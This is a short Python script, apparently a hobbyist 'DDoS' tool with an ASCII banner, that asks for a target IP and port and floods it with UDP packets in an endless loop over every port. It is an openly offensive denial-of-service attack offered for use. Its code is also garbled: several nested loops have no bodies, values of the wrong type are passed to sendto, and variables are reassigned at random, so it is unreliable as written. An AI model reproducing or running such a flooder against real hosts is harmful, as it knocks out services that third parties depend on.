#Author WHITE L'
import socket
import os
import random
import time
import sys
import struct
import threading

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(21000)
threads = random._urandom(21000)
sent = random._urandom(21000)
os.system("clear")
print("""
\033[91m
 
██████╗░░█████╗░░█████╗░██╗░░██╗██╗░░░██╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝╚██╗░██╔╝
██████╔╝██║░░██║██║░░╚═╝█████═╝░░╚████╔╝░
██╔══██╗██║░░██║██║░░██╗██╔═██╗░░░╚██╔╝░░
██║░░██║╚█████╔╝╚█████╔╝██║░╚██╗░░░██║░░░
╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░
""")

ip = input("[+] Enter the target's IP : ")
port = input("[+] Enter the target Port : ")
sent = input("[+] Enter the sent packet : ")
threads = input("[+] Enter the threads packet : ")
bytes = input("[+] Enter the Bytes Attack : ")
os.system("clear")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
    	for sent in range(1, 65534):
    	for threads in range(1, 65534):
        white.sendto(bytes, (ip, port))
        white.sendto(threads, (ip, port))
        white.sendto(sent, (ip, port))
        white.sendto(port, (ip, port))
        sent = sent + 1
        sent==65534
        port = port + 1
        port==65534
        threads = threads + 1
        threads==65534
        bytes= bytes + 1
        bytes==65534
        print("\033[1;91mMengirim Pizza Hot Ke \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
